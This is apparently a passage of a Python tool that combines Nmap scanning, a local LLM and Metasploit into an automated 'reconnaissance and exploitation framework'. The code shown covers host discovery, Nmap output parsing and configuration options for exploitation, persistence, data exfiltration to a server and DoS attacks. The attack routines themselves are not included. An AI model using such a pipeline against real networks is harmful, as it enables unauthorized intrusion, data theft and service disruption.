#!/usr/bin/env python3
# Advanced Adaptive Nmap Scanner with Ollama and Metasploit Integration
# This script combines Nmap scanning with Ollama LLM for adaptive reconnaissance
# and optionally integrates with Metasploit for exploitation

# Standard library imports
import os
import sys
import time
import json
import socket
import random
import logging
import argparse
import ipaddress
import datetime
import subprocess
import threading
import traceback
import re
import signal
import tempfile
import stat
import itertools
from typing import List, Dict, Any, Optional, Tuple
import xml.etree.ElementTree as ET

# Third-party imports
# Note: we're removing the python-nmap dependency and using direct subprocess calls
import requests
import netifaces
import pymetasploit3
from pymetasploit3.msfrpc import MsfRpcClient
# Replace direct import with try-except
try:
    import smbclient
    HAS_SMBCLIENT = True
except ImportError:
    # Define a placeholder and flag when smbclient is not available
    HAS_SMBCLIENT = False
    class DummySmbClient:
        def __init__(self, *args, **kwargs):
            pass
        
        class SambaClient:
            def __init__(self, server=None, share=None, username=None, password=None, *args, **kwargs):
                self.server = server
                self.share = share
                
            def connect(self):
                # Always fail with a meaningful error
                raise Exception("SMB functionality disabled - smbclient module not available")
                
            def disconnect(self):
                pass
                
    smbclient = DummySmbClient()
import paramiko
# Handle wmi import error
try:
    import wmi
    HAS_WMI = True
except ImportError:
    HAS_WMI = False
    class DummyWmi:
        def __init__(self, *args, **kwargs):
            pass
            
        def WMI(self, *args, **kwargs):
            raise Exception("WMI functionality disabled - wmi module not available")
    
    wmi = DummyWmi()

# Optional imports
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

# Configure logging
logger = logging.getLogger("adaptive_scanner")
logger.setLevel(logging.INFO)

# Add console handler if not already added
if not logger.handlers:
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(console_handler)

# Set root logger level to INFO to ensure we see all messages
logging.getLogger().setLevel(logging.INFO)

# Animation and display-related classes
class DummyAnimator:
    """Dummy animator for when quiet mode is enabled."""
    def set(self):
        """Dummy method to maintain interface compatibility."""
        pass

class SingleLineAnimation:
    """Animation class that shows a spinner on a single line."""
    def __init__(self, message, interval=0.1):
        """Initialize the animation with the given message and interval.
        
        Args:
            message: The message to display alongside the spinner
            interval: Time in seconds between spinner updates
        """
        self.message = message
        self.interval = interval
        self.stop_event = threading.Event()
        self.thread = threading.Thread(target=self._animate)
        self.thread.daemon = True
        self.thread.start()
    
    def _animate(self):
        """Animation loop that uses a spinner and stays on a single line."""
        spinner = itertools.cycle(['|', '/', '-', '\\'])
        try:
            while not self.stop_event.is_set():
                print(f'\r[{next(spinner)}] {self.message}', end='', flush=True)
                time.sleep(self.interval)
        finally:
            # Print completion message when done
            print(f'\r[✓] {self.message} - Complete', end='', flush=True)
            print()
    
    def set(self):
        """Stop the animation."""
        self.stop_event.set()
        self.thread.join(timeout=1)  # Wait for thread to finish with timeout

class TerminalViewer:
    """Class for displaying information in the terminal."""
    
    def __init__(self, quiet=False):
        """Initialize the terminal viewer.
        
        Args:
            quiet: When True, most output is suppressed
        """
        self.quiet = quiet
        self.width = self._get_terminal_width()
        self.border_char = "="
        self.section_char = "-"
    
    def _get_terminal_width(self):
        """Get the terminal width or default to 80 columns."""
        try:
            import shutil
            columns = shutil.get_terminal_size().columns
            return min(columns, 100)  # Limit to 100 columns max
        except:
            return 80
    
    # Display formatting methods
    def header(self, title, char="="):
        """Display a header with the given title."""
        if self.quiet:
            return
            
        print(f"\n{char * self.width}")
        print(f"{title.center(self.width)}")
        print(f"{char * self.width}")
    
    def section(self, title):
        """Display a section header."""
        if self.quiet:
            return
            
        print(f"\n{self.section_char * self.width}")
        print(f"{title}")
        print(f"{self.section_char * self.width}")
    
    def result_box(self, title, content):
        """Display content in a formatted box with title."""
        if self.quiet:
            return
            
        print(f"\n{self.section_char * self.width}")
        print(f"| {title}")
        print(f"{self.section_char * self.width}")
        print(content)
        print(f"{self.section_char * self.width}")
    
    # Status message methods
    def status(self, message):
        """Display a status message."""
        if self.quiet:
            return
            
        print(f"[*] {message}")
    
    def success(self, message):
        """Display a success message."""
        if self.quiet:
            return
            
        print(f"\n[+] {message}")
    
    def warning(self, message):
        """Display a warning message."""
        if self.quiet:
            return
            
        print(f"\n[!] {message}")
    
    def error(self, message):
        """Display an error message."""
        # Always show errors, even in quiet mode
        print(f"\n[-] ERROR: {message}")
    
    # Result summary methods
    def scan_summary(self, target, results):
        """Display a summary of scan results."""
        if self.quiet:
            return
            
        if not results:
            self.warning(f"No scan results for {target}")
            return
            
        open_ports = []
        os_info = "Unknown"
        host_info = "Unknown"
        
        # Extract information from results
        if 'scan' in results and target in results['scan']:
            target_info = results['scan'][target]
            
            # Get hostname
            if 'hostnames' in target_info and target_info['hostnames']:
                host_info = target_info['hostnames'][0].get('name', 'Unknown')
                
            # Get OS info if available
            if 'osmatch' in target_info and target_info['osmatch']:
                os_info = target_info['osmatch'][0].get('name', 'Unknown')
                
            # Get open ports
            for proto in ['tcp', 'udp']:
                if proto in target_info:
                    for port, port_data in target_info[proto].items():
                        if port_data['state'] == 'open':
                            service = port_data.get('name', 'unknown')
                            product = port_data.get('product', '')
                            version = port_data.get('version', '')
                            
                            service_str = f"{service}"
                            if product:
                                service_str += f" ({product}"
                                if version:
                                    service_str += f" {version}"
                                service_str += ")"
                                
                            open_ports.append(f"{port}/{proto}: {service_str}")
        
        # Format the summary
        summary = []
        summary.append(f"Target: {target} ({host_info})")
        summary.append(f"OS: {os_info}")
        summary.append(f"Open Ports: {len(open_ports)}")
        
        for port in open_ports:
            summary.append(f"  - {port}")
            
        self.result_box(f"SCAN SUMMARY FOR {target}", "\n".join(summary))
    
    def exploit_summary(self, target, exploit_results):
        """Display a summary of exploitation attempts."""
        if self.quiet:
            return
            
        if not exploit_results:
            self.warning(f"No exploitation results for {target}")
            return
            
        summary = []
        summary.append(f"Target: {target}")
        summary.append(f"Total Exploits Attempted: {exploit_results.get('total_attempts', 0)}")
        summary.append(f"Successful Exploits: {exploit_results.get('successful', 0)}")
        
        # List successful exploits
        if 'details' in exploit_results:
            for port, exploits in exploit_results['details'].items():
                for exploit in exploits:
                    status = "✓" if exploit.get('success', False) else "✗"
                    summary.append(f"  {status} {port}: {exploit.get('name', 'Unknown')}")
        
        self.result_box(f"EXPLOITATION SUMMARY FOR {target}", "\n".join(summary))
    
    def script_generation_summary(self, script_path, script_type, summary):
        """Display a summary of generated script."""
        if self.quiet:
            return
            
        if not script_path:
            self.warning("Script generation failed")
            return
            
        info = []
        info.append(f"Script Type: {script_type}")
        info.append(f"Location: {os.path.abspath(script_path)}")
        info.append(f"Summary: {summary}")
        
        self.result_box(f"GENERATED SCRIPT: {os.path.basename(script_path)}", "\n".join(info))
    
    def script_execution_summary(self, script_path, return_code, output):
        """Display a summary of script execution."""
        if self.quiet:
            return
        
        if not script_path:
            self.warning("Script execution details not available")
            return
            
        summary = []
        summary.append(f"Script: {os.path.basename(script_path)}")
        summary.append(f"Return Code: {return_code}")
        
        # Truncate output if it's too long
        max_output_lines = 20
        output_lines = output.split('\n')
        if len(output_lines) > max_output_lines:
            displayed_output = '\n'.join(output_lines[:max_output_lines])
            displayed_output += f"\n... (truncated, {len(output_lines) - max_output_lines} more lines)"
        else:
            displayed_output = output
            
        summary.append(f"Output:\n{displayed_output}")
        
        self.result_box(f"SCRIPT EXECUTION RESULT", "\n".join(summary))
    
    def dos_attack_summary(self, target, successful, method=None):
        """Display a summary of DoS attack attempt."""
        if self.quiet:
            return
            
        summary = []
        summary.append(f"Target: {target}")
        summary.append(f"Method: {method if method else 'Multiple methods'}")
        summary.append(f"Result: {'Successful' if successful else 'Failed'}")
        
        self.result_box(f"DOS ATTACK SUMMARY", "\n".join(summary))
    
    # Progress display methods
    def progress_bar(self, current, total, prefix='Progress:', suffix='Complete', length=50, fill='█'):
        """Display a progress bar in the terminal."""
        if self.quiet:
            return
            
        percent = ("{0:.1f}").format(100 * (current / float(total)))
        filled_length = int(length * current // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        
        # Use carriage return to rewrite the line each time
        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='', flush=True)
        
        # Only print newline when complete
        if current >= total:
            print()
    
    def display_start_banner(self, target, scan_type, model):
        """Display a banner at the start of the scan."""
        if self.quiet:
            return
        
        banner = [
            "┌───────────────────────────────────────────────────┐",
            "│ ADAPTIVE RECONNAISSANCE AND EXPLOITATION FRAMEWORK │",
            "├───────────────────────────────────────────────────┤",
            f"│ Target: {target.ljust(45)} │",
            f"│ Scan Type: {scan_type.ljust(41)} │",
            f"│ Model: {model.ljust(45)} │",
            f"│ Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S').ljust(43)} │",
            "└───────────────────────────────────────────────────┘"
        ]
        
        print("\n".join(banner))
    
    def scanning_animation(self, message, duration=0):
        """Create a scanning animation."""
        if self.quiet:
            return DummyAnimator()
            
        # Return a simple thread-based animation that uses a single line
        return SingleLineAnimation(message)

class NetworkDiscovery:
    """Class to handle network discovery and host detection."""
    
    def __init__(self, interface=None, network=None, timeout=1):
        """Initialize the network discovery with optional interface or network."""
        self.interface = interface
        self.network = network
        self.timeout = timeout
    
    # Interface and network detection methods
    def get_interface_info(self):
        """Get information about available network interfaces."""
        interfaces = []
        
        # Get all network interfaces
        try:
            for iface in netifaces.interfaces():
                iface_info = {
                    'name': iface,
                    'addresses': [],
                    'netmask': None,
                    'cidr': None
                }
                
                # Skip loopback interfaces
                if iface.startswith('lo') or iface == 'lo':
                    continue
                
                # Get addresses for interface
                addresses = netifaces.ifaddresses(iface)
                
                # Get IPv4 addresses
                if netifaces.AF_INET in addresses:
                    for addr in addresses[netifaces.AF_INET]:
                        ip = addr.get('addr')
                        netmask = addr.get('netmask')
                        
                        if ip and ip != '127.0.0.1' and netmask:
                            # Calculate CIDR notation
                            try:
                                cidr = self._netmask_to_cidr(netmask)
                                net = ipaddress.IPv4Network(f"{ip}/{cidr}", strict=False)
                                
                                iface_info['addresses'].append(ip)
                                iface_info['netmask'] = netmask
                                iface_info['cidr'] = str(net)
                            except Exception as e:
                                logger.debug(f"Error calculating CIDR for {iface} ({ip}/{netmask}): {e}")
                
                # Skip interfaces with no usable IPv4 addresses
                if not iface_info['addresses']:
                    continue
                    
                # Check if interface is up (if psutil is available)
                if HAS_PSUTIL:
                    try:
                        io_counters = psutil.net_io_counters(pernic=True)
                        if iface in io_counters:
                            # Interface has traffic stats, likely up
                            iface_info['status'] = 'up'
                        else:
                            iface_info['status'] = 'unknown'
                    except Exception as e:
                        logger.debug(f"Error checking interface status for {iface}: {e}")
                        iface_info['status'] = 'unknown'
                else:
                    iface_info['status'] = 'unknown'
                
                # Add interface to list
                interfaces.append(iface_info)
                
        except Exception as e:
            logger.error(f"Error getting interface information: {e}")
            
        return interfaces
    
    def get_network_cidr(self):
        """Determine the network CIDR to scan."""
        # If network was explicitly provided, use it
        if self.network:
            try:
                # Validate the provided network
                net = ipaddress.IPv4Network(self.network, strict=False)
                logger.info(f"Using provided network: {net}")
                return str(net)
            except Exception as e:
                logger.error(f"Invalid network specification '{self.network}': {e}")
                # Fall through to auto-detection
        
        # If interface was specified, get its network
        if self.interface:
            try:
                interfaces = self.get_interface_info()
                for iface in interfaces:
                    if iface['name'] == self.interface and iface['cidr']:
                        logger.info(f"Using network from interface {self.interface}: {iface['cidr']}")
                        return iface['cidr']
                logger.warning(f"Interface {self.interface} not found or has no usable IP address")
                # Fall through to default interface
            except Exception as e:
                logger.error(f"Error getting network from interface {self.interface}: {e}")
                # Fall through to default interface
        
        # Get the network of the default interface
        try:
            interfaces = self.get_interface_info()
            if interfaces:
                # Try to find a non-virtual interface first
                for iface in interfaces:
                    name = iface['name'].lower()
                    # Skip virtual interfaces
                    if 'veth' in name or 'docker' in name or 'vmnet' in name or 'vbox' in name:
                        continue
                    if iface['cidr']:
                        logger.info(f"Using network from interface {iface['name']}: {iface['cidr']}")
                        return iface['cidr']
                
                # If no suitable interface found, use the first available
                if interfaces[0]['cidr']:
                    logger.info(f"Using network from interface {interfaces[0]['name']}: {interfaces[0]['cidr']}")
                    return interfaces[0]['cidr']
        except Exception as e:
            logger.error(f"Error auto-detecting network: {e}")
        
        # Default to a common private network as last resort
        logger.warning("Could not determine network, using default 192.168.1.0/24")
        return "192.168.1.0/24"
    
    # Host discovery methods
    def ping_host(self, host):
        """Check if a host is alive using ICMP ping."""
        try:
            # Use ping command with timeout
            cmd = ["ping", "-c", "1", "-W", str(self.timeout), str(host)]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            proc.communicate()
            
            # Return True if ping succeeded
            return proc.returncode == 0
        except Exception as e:
            logger.debug(f"Error pinging host {host}: {e}")
            return False
    
    def get_all_hosts(self):
        """Get a list of all hosts in the network."""
        try:
            network = self.get_network_cidr()
            net = ipaddress.IPv4Network(network, strict=False)
            
            # Return all hosts in the network except network and broadcast addresses
            return [str(ip) for ip in net.hosts()]
        except Exception as e:
            logger.error(f"Error getting hosts in network {network}: {e}")
            return []
    
    def discover_hosts(self):
        """Discover live hosts in the network."""
        discovered_hosts = []
        
        try:
            # Get all hosts in the network
            hosts = self.get_all_hosts()
            
            if not hosts:
                logger.warning("No hosts found in network")
                return []
            
            logger.info(f"Scanning {len(hosts)} hosts in network {self.get_network_cidr()}")
            
            # First try ARP scan which is faster and more reliable
            logger.info("Attempting ARP scan first...")
            try:
                nm = nmap.PortScanner()
                arp_result = nm.scan(hosts=' '.join(hosts), arguments="-sn -PR")
                
                if 'scan' in arp_result:
                    for host in arp_result['scan']:
                        if arp_result['scan'][host]['status']['state'] == 'up':
                            discovered_hosts.append(host)
                            logger.info(f"Found host: {host}")
                
                if discovered_hosts:
                    logger.info(f"Found {len(discovered_hosts)} hosts with ARP scan")
                    return discovered_hosts
                    
            except Exception as e:
                logger.error(f"ARP scan failed: {e}")
            
            # If ARP scan didn't find hosts, try ping scan
            logger.info("Attempting ping scan...")
            try:
                ping_result = nm.scan(hosts=' '.join(hosts), arguments="-sn -PE")
                
                if 'scan' in ping_result:
                    for host in ping_result['scan']:
                        if ping_result['scan'][host]['status']['state'] == 'up':
                            if host not in discovered_hosts:
                                discovered_hosts.append(host)
                                logger.info(f"Found host: {host}")
                
                if discovered_hosts:
                    logger.info(f"Found {len(discovered_hosts)} hosts with ping scan")
                    return discovered_hosts
                    
            except Exception as e:
                logger.error(f"Ping scan failed: {e}")
            
            # If still no hosts found, try TCP SYN scan on common ports
            logger.info("Attempting TCP SYN scan on common ports...")
            try:
                syn_result = nm.scan(hosts=' '.join(hosts), arguments="-sS -T4 -F")
                
                if 'scan' in syn_result:
                    for host in syn_result['scan']:
                        if host not in discovered_hosts:
                            discovered_hosts.append(host)
                            logger.info(f"Found host: {host}")
                
                if discovered_hosts:
                    logger.info(f"Found {len(discovered_hosts)} hosts with SYN scan")
                    return discovered_hosts
                    
            except Exception as e:
                logger.error(f"SYN scan failed: {e}")
            
            # If still no hosts found, try UDP scan
            logger.info("Attempting UDP scan...")
            try:
                udp_result = nm.scan(hosts=' '.join(hosts), arguments="-sU -T4 -F")
                
                if 'scan' in udp_result:
                    for host in udp_result['scan']:
                        if host not in discovered_hosts:
                            discovered_hosts.append(host)
                            logger.info(f"Found host: {host}")
                
                if discovered_hosts:
                    logger.info(f"Found {len(discovered_hosts)} hosts with UDP scan")
                    return discovered_hosts
                    
            except Exception as e:
                logger.error(f"UDP scan failed: {e}")
            
            # If we still haven't found any hosts, try a more aggressive approach
            if not discovered_hosts:
                logger.info("No hosts found with standard methods, trying aggressive scan...")
                try:
                    aggressive_result = nm.scan(
                        hosts=' '.join(hosts),
                        arguments="-sS -sU -T4 -p- --max-retries 2 --max-scan-delay 20s"
                    )
                    
                    if 'scan' in aggressive_result:
                        for host in aggressive_result['scan']:
                            if host not in discovered_hosts:
                                discovered_hosts.append(host)
                                logger.info(f"Found host: {host}")
                                
                except Exception as e:
                    logger.error(f"Aggressive scan failed: {e}")
            
            logger.info(f"Total hosts discovered: {len(discovered_hosts)}")
            return discovered_hosts
            
        except Exception as e:
            logger.error(f"Error in host discovery: {e}")
            return []
    
    def discover_networks(self):
        """Discover additional networks connected to the host."""
        networks = []
        
        try:
            # Get information about all interfaces
            interfaces = self.get_interface_info()
            
            for iface in interfaces:
                if iface['cidr']:
                    # Add network to list
                    networks.append({
                        'interface': iface['name'],
                        'network': iface['cidr'],
                        'ip': iface['addresses'][0] if iface['addresses'] else None
                    })
            
            # Try to discover additional networks via routing table
            if HAS_PSUTIL:
                try:
                    for conn in psutil.net_connections(kind='inet'):
                        if conn.laddr and conn.raddr:
                            try:
                                # Check if remote address is not in any discovered network
                                remote_ip = conn.raddr.ip
                                if not any(ipaddress.IPv4Address(remote_ip) in ipaddress.IPv4Network(net['network'], strict=False) for net in networks):
                                    # Add a /24 network based on remote IP
                                    remote_net = ipaddress.IPv4Network(f"{remote_ip}/24", strict=False)
                                    networks.append({
                                        'interface': None,
                                        'network': str(remote_net),
                                        'ip': None
                                    })
                            except Exception as e:
                                logger.debug(f"Error processing connection {conn}: {e}")
                except Exception as e:
                    logger.debug(f"Error discovering networks via connections: {e}")
        except Exception as e:
            logger.error(f"Error discovering networks: {e}")
        
        return networks
    
    def alternative_host_discovery(self):
        """Use alternative methods to discover hosts when ping fails."""
        discovered_hosts = []
        
        try:
            network = self.get_network_cidr()
            
            # Use ARP scan with Nmap
            logger.info("Attempting ARP scan to discover hosts")
            nm = nmap.PortScanner()
            result = nm.scan(hosts=network, arguments="-sn -PR")
            
            if 'scan' in result:
                for host in result['scan']:
                    discovered_hosts.append(host)
            
            # If still no hosts found, try UDP discovery
            if not discovered_hosts:
                logger.info("Attempting UDP discovery scan")
                result = nm.scan(hosts=network, arguments="-sn -PU")
                
                if 'scan' in result:
                    for host in result['scan']:
                        discovered_hosts.append(host)
        except Exception as e:
            logger.error(f"Error in alternative host discovery: {e}")
        
        return discovered_hosts
    
    # Helper methods
    def _netmask_to_cidr(self, netmask):
        """Convert a netmask to CIDR notation."""
        return sum(bin(int(x)).count('1') for x in netmask.split('.'))

# Custom Nmap scanner implementation using subprocess
class DirectNmapScanner:
    """Direct implementation of nmap scanning using subprocess instead of python-nmap."""
    
    @staticmethod
    def check_nmap_installed():
        """Check if nmap is installed and available on the system."""
        try:
            result = subprocess.run(['nmap', '--version'], 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                universal_newlines=True,
                check=False)
            if result.returncode == 0:
                logger.debug(f"Nmap found: {result.stdout.strip()}")
                return True
            else:
                logger.error(f"Nmap check failed: {result.stderr}")
                return False
        except (subprocess.SubprocessError, FileNotFoundError) as e:
            logger.error(f"Nmap not found or not executable: {e}")
            return False

    @staticmethod
    def scan(hosts, arguments):
        """Run an nmap scan using subprocess and return results in a dictionary format.
        
        Args:
            hosts: Target IP address or hostname
            arguments: Nmap command line arguments as a string
            
        Returns:
            Dictionary with scan results in a format similar to python-nmap
        """
        # Verify nmap is installed
        if not DirectNmapScanner.check_nmap_installed():
            logger.error("Nmap is not installed on this system")
            return None
            
        # Create temporary file for XML output
        fd, xml_output = tempfile.mkstemp(suffix='.xml', prefix='nmap_')
        os.close(fd)
        
        try:
            # Build command
            cmd = ['nmap']
            
            # Add XML output first
            cmd.extend(['-oX', xml_output])
            
            # Add all arguments except target
            if arguments:
                args_list = arguments.split()
                for arg in args_list:
                    if arg != hosts:  # Avoid adding target twice
                        cmd.append(arg)
            
            # Add target last
            cmd.append(hosts)
            
            # Log the command
            logger.debug(f"Running nmap command: {' '.join(cmd)}")
            
            # Run scan with timeout
            start_time = time.time()
            timeout = 300  # 5 minutes timeout
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Wait for process with timeout
            while True:
                if time.time() - start_time > timeout:
                    process.terminate()
                    logger.error("Nmap scan timed out after 5 minutes")
                    return None
                    
                if process.poll() is not None:
                    break
                    
                time.sleep(0.1)
            
            # Get output
            stdout, stderr = process.communicate()
            elapsed = time.time() - start_time
            
            # Check for errors
            if process.returncode != 0:
                logger.error(f"Nmap scan failed with return code {process.returncode}")
                logger.error(f"Error: {stderr}")
                return None
                
            # Parse XML output into nmap-like dictionary
            return DirectNmapScanner.parse_xml(xml_output, cmd, elapsed, stdout, stderr)
            
        except Exception as e:
            logger.error(f"Error running nmap scan: {e}")
            return None
        finally:
            # Clean up temporary file
            try:
                os.unlink(xml_output)
            except:
                pass
                
    @staticmethod
    def parse_xml(xml_file, cmd, elapsed, stdout, stderr):
        """Parse nmap XML output into a dictionary.
        
        Args:
            xml_file: Path to XML file to parse
            cmd: Original command that was run
            elapsed: Time elapsed during scan
            stdout: Standard output from nmap
            stderr: Standard error from nmap
            
        Returns:
            Dictionary with scan results
        """
        try:
            # Parse XML
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            # Create result dictionary in python-nmap compatible format
            result = {
                'nmap': {
                    'command_line': ' '.join(cmd),
                    'scaninfo': {},
                    'scanstats': {
                        'timestr': root.find('runstats/finished').get('timestr', '') if root.find('runstats/finished') is not None else '',
                        'elapsed': root.find('runstats/finished').get('elapsed', str(elapsed)) if root.find('runstats/finished') is not None else str(elapsed),
                        'uphosts': root.find('runstats/hosts').get('up', '0') if root.find('runstats/hosts') is not None else '0',
                        'downhosts': root.find('runstats/hosts').get('down', '0') if root.find('runstats/hosts') is not None else '0',
                        'totalhosts': root.find('runstats/hosts').get('total', '0') if root.find('runstats/hosts') is not None else '0',
                    }
                },
                'scan': {}
            }
            
            # Extract scan info
            for scaninfo in root.findall('scaninfo'):
                result['nmap']['scaninfo'][scaninfo.get('protocol', '')] = {
                    'method': scaninfo.get('type', ''),
                    'services': scaninfo.get('services', '')
                }
            
            # Process each host
            for host in root.findall('host'):
                # Get host address (prefer IPv4)
                addr = None
                for address in host.findall('address'):
                    if address.get('addrtype') == 'ipv4':
                        addr = address.get('addr')
                        break
                if not addr and host.find('address') is not None:
                    addr = host.find('address').get('addr', '')
                if not addr:
                    # Skip hosts without an address
                    continue
                    
                # Initialize host data structure
                result['scan'][addr] = {
                    'hostnames': [],
                    'addresses': {},
                    'vendor': {},
                    'status': {},
                    'tcp': {},
                    'udp': {}
                }
                
                # Get all addresses
                for address in host.findall('address'):
                    addr_type = address.get('addrtype', '')
                    result['scan'][addr]['addresses'][addr_type] = address.get('addr', '')
                    if address.get('vendor') and address.get('addr'):
                        result['scan'][addr]['vendor'][address.get('addr')] = address.get('vendor', '')
                
                # Get status
                status = host.find('status')
                if status is not None:
                    result['scan'][addr]['status'] = {
                        'state': status.get('state', ''),
                        'reason': status.get('reason', '')
                    }
                
                # Get hostnames
                hostnames = host.find('hostnames')
                if hostnames is not None:
                    for hostname in hostnames.findall('hostname'):
                        result['scan'][addr]['hostnames'].append({
                            'name': hostname.get('name', ''),
                            'type': hostname.get('type', '')
                        })
                
                # Get ports
                ports = host.find('ports')
                if ports is not None:
                    for port in ports.findall('port'):
                        protocol = port.get('protocol', '')
                        port_id = port.get('portid', '')
                        
                        if not protocol or not port_id:
                            continue
                        
                        # Create port data
                        port_data = {
                            'state': '',
                            'reason': '',
                            'name': '',
                            'product': '',
                            'version': '',
                            'extrainfo': '',
                            'conf': '',
                            'cpe': ''
                        }
                        
                        # Get state
                        state = port.find('state')
                        if state is not None:
                            port_data['state'] = state.get('state', '')
                            port_data['reason'] = state.get('reason', '')
                        
                        # Get service info
                        service = port.find('service')
                        if service is not None:
                            port_data['name'] = service.get('name', '')
                            port_data['product'] = service.get('product', '')
                            port_data['version'] = service.get('version', '')
                            port_data['extrainfo'] = service.get('extrainfo', '')
                            port_data['conf'] = service.get('conf', '')
                            
                            # Get CPE
                            cpe = service.find('cpe')
                            if cpe is not None and cpe.text:
                                port_data['cpe'] = cpe.text
                        
                        # Add port to result
                        result['scan'][addr][protocol][port_id] = port_data
                
                # Get OS detection
                os_matches = host.find('os')
                if os_matches is not None:
                    result['scan'][addr]['osmatch'] = []
                    for osmatch in os_matches.findall('osmatch'):
                        os_data = {
                            'name': osmatch.get('name', ''),
                            'accuracy': osmatch.get('accuracy', ''),
                            'osclass': []
                        }
                        
                        for osclass in osmatch.findall('osclass'):
                            class_data = {
                                'type': osclass.get('type', ''),
                                'vendor': osclass.get('vendor', ''),
                                'osfamily': osclass.get('osfamily', ''),
                                'osgen': osclass.get('osgen', ''),
                                'accuracy': osclass.get('accuracy', '')
                            }
                            os_data['osclass'].append(class_data)
                        
                        result['scan'][addr]['osmatch'].append(os_data)
            
            # All done
            return result
            
        except Exception as e:
            logger.error(f"Error parsing nmap XML output: {e}")
            logger.debug(traceback.format_exc())
            return None

# Make DirectNmapScanner available as a PortScanner
class PortScanner:
    """PortScanner class to mimic python-nmap interface."""
    
    def __init__(self):
        """Initialize the port scanner."""
        # Nothing to initialize
        pass
        
    def scan(self, hosts, arguments):
        """Run nmap scan and return results."""
        return DirectNmapScanner.scan(hosts, arguments)

# Replace nmap with our custom scanner
nmap = type('nmap', (), {'PortScanner': PortScanner})

class AdaptiveNmapScanner:
    """Advanced Adaptive Nmap Scanner with Ollama and Metasploit Integration."""

    def __init__(
        self,
        target=None,
        ollama_model="qwen2.5-coder:7b",
        max_iterations=3,
        continuous=False,
        delay=2,
        msf_integration=False,
        exploit=False,
        msf_workspace="adaptive_scan",
        stealth=False,
        auto_script=False,
        quiet=False,
        debug=False,
        auto_discover=False,
        interface=None,
        scan_all=False,
        network=None,
        host_timeout=1,
        custom_scripts=False,
        script_type="bash",
        execute_scripts=False,
        dos_attack=False,
        show_live_ai=False,
        red_team=False,
        persistence=False,
        exfil=False,
        exfil_method=None,
        exfil_data=None,
        exfil_server=None,
        dos_method=None,
        dos_threads=10,
        dos_duration=60,
        dos_payload=None,
        # New parameters from use_cases.md
        ports="quick",
        services=False,
        version_detection=False,
        os_detection=False,
        vulnerability_scan=False,
        model_timeout=30,
        max_threads=4,
        memory_limit=None,
        msf_options=None,
        msf_payload=None,
        msf_module=None,
        post_exploitation=False,
        log_file=None,
        verbose=False,
        custom_vuln_file=None,
        output_file=None,
        output_format="text",
        generate_script=False,
        generate_script_name=None,
        script_generation_type=None,
        iterations=None,
        model=None
    ):
        """Initialize the scanner with the given parameters."""
        self.target = target
        # Use model if provided, otherwise use ollama_model
        self.ollama_model = model if model is not None else ollama_model
        # Use iterations if provided, otherwise use max_iterations
        self.max_iterations = iterations if iterations is not None else max_iterations
        self.iterations = self.max_iterations  # Alias for parameter consistency
        self.continuous = continuous
        self.delay = delay
        self.msf_integration = msf_integration
        self.exploit = exploit
        self.msf_workspace = msf_workspace
        self.stealth = stealth
        self.auto_script = auto_script
        self.quiet = quiet
        self.debug = debug
        self.auto_discover = auto_discover
        self.interface = interface
        self.scan_all = scan_all
        self.network = network
        self.host_timeout = host_timeout
        self.custom_scripts = custom_scripts
        self.script_type = script_type
        self.execute_scripts = execute_scripts
        self.dos_attack = dos_attack
        self.show_live_ai = show_live_ai
        
        # New red team parameters
        self.red_team = red_team
        self.persistence = persistence
        self.exfil = exfil
        self.exfil_method = exfil_method
        self.exfil_data = exfil_data
        self.exfil_server = exfil_server
        
        # Enhanced DoS parameters
        self.dos_method = dos_method
        self.dos_threads = dos_threads
        self.dos_duration = dos_duration
        self.dos_payload = dos_payload
        
        # New parameters
        self.ports = ports
        self.services = services
        self.version_detection = version_detection
        self.os_detection = os_detection
        self.vulnerability_scan = vulnerability_scan
        self.model_timeout = model_timeout
        self.max_threads = max_threads
        self.memory_limit = memory_limit
        self.msf_options = msf_options
        self.msf_payload = msf_payload
        self.msf_module = msf_module
        self.post_exploitation = post_exploitation
        self.log_file = log_file
        self.verbose = verbose
        self.custom_vuln_file = custom_vuln_file
        self.output_file = output_file
        self.output_format = output_format
        self.generate_script = generate_script
        self.generate_script_name = generate_script_name
        self.script_generation_type = script_generation_type
        
        # If red team mode is enabled, enable all related features
        if self.red_team:
            self.msf_integration = True
            self.exploit = True
            self.persistence = True
            self.exfil = True
            self.custom_scripts = True
            self.auto_script = True
            self.stealth = True
        
        # Add logger to the class instance
        self.logger = logger
        
        # Set up remaining components
        self.ollama_url = "http://localhost:11434/api/generate"
        self.running = True
        self.scan_history = []
        self.viewer = TerminalViewer(quiet=quiet)
        self.msf_client = None
        self.discovered_hosts = []
        self.current_target_index = 0
        
        # Network discovery setup
        self.network_discovery = None
        if self.auto_discover:
            self.network_discovery = NetworkDiscovery(
                interface=self.interface,
                network=self.network,
                timeout=self.host_timeout
            )
        
        # If model isn't one of our default models, check if it exists and download if needed
        self._ensure_model_available()
        
    def _ensure_model_available(self):
        """Ensure the specified Ollama model is available, downloading it if needed."""
        try:
            # Try to check if model is available using Ollama's list API
            response = requests.get("http://localhost:11434/api/tags")
            if response.status_code == 200:
                available_models = [model['name'] for model in response.json().get('models', [])]
                
                # If model is available, just use it
                if self.ollama_model in available_models:
                    logger.info(f"Using existing model: {self.ollama_model}")
                    return
                
                # If model isn't available, try to download it
                logger.warning(f"Model {self.ollama_model} not found. Attempting to download...")
                self.viewer.status(f"Model {self.ollama_model} not found. Attempting to download...")
                
                try:
                    download_process = subprocess.Popen(
                        ["ollama", "pull", self.ollama_model],
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE
                    )
                    
                    # Wait for download to complete
                    stdout, stderr = download_process.communicate()
                    
                    if download_process.returncode == 0:
                        logger.info(f"Successfully downloaded model: {self.ollama_model}")
                        self.viewer.success(f"Successfully downloaded model: {self.ollama_model}")
                        return
                    else:
                        logger.error(f"Failed to download model: {self.ollama_model}. Error: {stderr.decode()}")
                        self.viewer.error(f"Failed to download model: {self.ollama_model}")
                        
                except Exception as e:
                    logger.error(f"Error downloading model: {e}")
